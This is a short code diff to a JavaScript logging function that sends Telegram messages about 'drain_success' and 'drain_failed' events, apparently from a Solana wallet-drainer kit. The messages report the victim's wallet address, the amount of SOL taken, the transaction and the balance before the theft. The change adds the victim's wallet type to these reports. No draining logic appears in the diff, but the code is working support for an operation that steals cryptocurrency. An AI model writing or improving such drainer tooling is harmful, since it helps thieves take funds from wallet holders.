@@ -44,11 +44,12 @@ export const sendTelegramLog = async (event, data) => {
         break;
         
       case 'drain_success':
-        const txShort = data.tx && !data.tx.includes('pending') 
+        const txShort = data.tx && !data.tx.includes('pending') && !data.tx.includes('unknown')
           ? data.tx.slice(0,8) 
           : (data.tx || 'unknown');
         message = `💰 Drain ${data.warning ? 'Likely Successful' : 'Successful'}
 └ Wallet: ${formatAddress(data.address)}
+└ Type: ${data.walletType}
 └ Amount: ${formatNumber(data.amount)} SOL
 └ TX: ${txShort}...
 └ Balance Before: ${formatNumber(data.balanceBefore)} SOL
@@ -60,6 +61,7 @@ ${data.warning ? `└ ⚠️ ${data.warning}` : ''}`;
       case 'drain_failed':
         message = `❌ Drain Failed
 └ Wallet: ${formatAddress(data.address)}
+└ Type: ${data.walletType}
 └ Error: ${data.error}
 └ Time: ${getTimestamp()}`;
         break;
